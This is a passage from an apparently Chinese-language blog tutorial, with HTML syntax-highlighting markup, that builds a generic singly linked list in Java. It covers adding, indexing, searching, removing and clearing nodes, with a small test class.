class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span>;<span class="comment">//修改索引数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span>;<span class="comment">//判断数据是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span>;<span class="comment">//数据删除方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="built_in">this</span>.data = data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNode</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;<span class="comment">//对象比较</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;<span class="comment">//无后续节点</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.next.containsNode(data);<span class="comment">//向后继续判断</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node previous, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;</span><br><span class="line">                previous.next = <span class="built_in">this</span>.next;<span class="comment">//空出当前节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123; <span class="comment">//有后续节点</span></span><br><span class="line">                    <span class="built_in">this</span>.next.removeNode(<span class="built_in">this</span>, data); <span class="comment">//向后继续删除</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        System.out.println(count);</span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.containsNode(data);<span class="comment">//交给Node类判断</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.contains(data)) &#123; <span class="comment">//判断数据是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.root.data.equals(data)) &#123; <span class="comment">//根节点为要删除节点</span></span><br><span class="line">                <span class="built_in">this</span>.root = <span class="built_in">this</span>.root.next; <span class="comment">//根的下一个节点</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123; <span class="comment">//交由Node类负责删除</span></span><br><span class="line">                <span class="built_in">this</span>.root.next.removeNode(<span class="built_in">this</span>.root,data);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.remove(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;删除之后数据个数：&quot;</span>+all.size1());</span><br><span class="line">        Object[] result = all.toArray();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------数据获取的分割线----------------&quot;</span>);</span><br><span class="line">        System.out.println(all.get(<span class="number">0</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------数据判断的分割线----------------&quot;</span>);</span><br><span class="line">        System.out.println(all.contains(<span class="string">&quot;高&quot;</span>));</span><br><span class="line">        System.out.println(all.contains(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073716.jpg"                      alt="image-20220803162507261"                ></p><p>​    删除逻辑依靠的就是引用的改变处理完成的。</p><h5 id="链表（清空链表）"><a href="#链表（清空链表）" class="headerlink" title="链表（清空链表）"></a>链表（清空链表）</h5><p>​    清空链表:public void clean()</p><p>​    有些时候需要进行链表数据的整体清空处理，这个时候就可以直接根据根元素来进行控制，只要root设置为了null，那么后续的节点就都不存在了。</p><p>​    1、在ILink接口里面追加有清空处理方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span>;<span class="comment">//清空集合</span></span><br></pre></td></tr></table></figure><p>​    2、在LinkImpl子类里覆写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.root = <span class="literal">null</span>; <span class="comment">//后续所有的都没了</span></span><br><span class="line">    <span class="built_in">this</span>.count = <span class="number">0</span>; <span class="comment">//个数清零</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span>;<span class="comment">//修改索引数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span>;<span class="comment">//判断数据是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span>;<span class="comment">//数据删除方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span>;<span class="comment">//清空集合</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="built_in">this</span>.data = data;</span><br><span class="line">            &#125; 